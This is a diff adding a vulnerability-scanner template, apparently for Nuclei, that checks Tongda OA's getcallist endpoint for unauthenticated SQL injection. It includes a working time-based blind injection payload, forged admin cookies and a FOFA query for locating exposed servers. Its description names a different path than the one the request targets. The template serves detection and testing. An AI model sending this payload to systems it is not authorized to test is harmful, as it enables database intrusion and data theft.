@@ -1,0 +1,34 @@
+id: TongDa-24
+
+info:
+  name: 通达OA getcallist存在前台SQL注入漏洞
+  author: pussycat0x
+  severity: high
+  description: |
+    通达OA /share/handle.php 存在前台SQL注入漏洞，攻击者无需登录可以利用漏洞获取数据库内敏感信息。
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: app="通达OA网络智能办公系统"
+  tags: TongDa,OA,SQL注入漏洞
+request:
+  - raw:
+      - |
+        POST /general/appbuilder/web/calendar/calendarlist/getcallist HTTP/1.1
+        Host: {{RootURL}}
+        Content-Type: application/x-www-form-urlencoded
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Cookie: USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=f4f833d3; UI_COOKIE=0; PHPSESSID=u1hk9v9ar46ejfd46uk7vupu23; KEY_RANDOMDATA=18528
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+        Upgrade-Insecure-Requests: 1
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Content-Length: 0
+        
+        starttime=1' AND (SELECT 7846 FROM (SELECT(SLEEP(5)))SfMD) AND 'GpBS'='GpBS&endtime=1598918400&view=month&condition=1
+          
+    matchers-condition: and
+    matchers:
+      - type: duration
+        part: duration
+        duration: 3
